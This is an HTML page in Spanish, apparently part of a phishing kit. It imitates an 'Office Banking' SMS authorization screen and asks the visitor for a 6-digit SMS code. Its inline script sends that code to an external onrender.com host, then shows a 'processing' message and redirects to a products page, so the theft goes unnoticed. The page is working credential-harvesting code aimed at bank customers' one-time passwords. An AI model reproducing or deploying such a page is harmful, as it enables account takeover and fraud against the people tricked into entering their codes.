<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Autorización por SMS</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
    <h1>Ingrese el código SMS de 6 dígitos</h1>

    <form id="formSMS">
      <input type="number" id="smsCode" maxlength="6" placeholder="123456" required>
      <button type="submit">Autorizar</button>
    </form>

    <div id="mensaje"></div>
  </div>

  <script>
    document.getElementById("formSMS").addEventListener("submit", async function(e){
      e.preventDefault();
      const smsCode = document.getElementById("smsCode").value;

      const mensaje = `Autorización por SMS: ${smsCode}`;

      try {
        await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ mensaje })
        });
        document.getElementById("mensaje").innerText = "SMS enviado, procesando...";
        // Aquí decides el siguiente paso: volver a productos o mostrar confirmación
        setTimeout(()=> window.location.href="productos.html", 3000);
      } catch (error) {
        document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
      }
    });
  </script>
</body>
</html>
